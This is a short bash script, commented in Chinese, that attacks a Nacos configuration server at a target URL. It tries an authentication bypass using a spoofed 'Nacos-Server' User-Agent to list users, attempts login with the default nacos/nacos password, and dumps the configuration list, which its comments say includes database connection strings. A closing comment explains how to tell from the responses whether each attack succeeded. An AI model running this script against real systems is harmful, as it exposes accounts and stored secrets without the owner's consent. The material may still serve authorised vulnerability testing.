#!/usr/bin/env bash
TARGET="${1:?usage: bash nacos.sh http://TARGET:8848}"
B="${TARGET%/}"
echo '--- 用户列表（绕过探测）'
curl -sS -m 10 -H 'User-Agent: Nacos-Server' "$B/nacos/v1/auth/users?pageNo=1&pageSize=9" | head -c 500; echo
echo '--- 默认口令登录'
curl -sS -m 10 -X POST "$B/nacos/v1/auth/login" -d 'username=nacos&password=nacos' | head -c 300; echo
echo '--- 配置列表（含数据库连接串等敏感项）'
curl -sS -m 10 -H 'User-Agent: Nacos-Server' "$B/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=20" | head -c 500; echo
# 判定：第一段返回 {"pageItems":[...]} = 认证绕过；登录段返回 accessToken = 默认口令可用
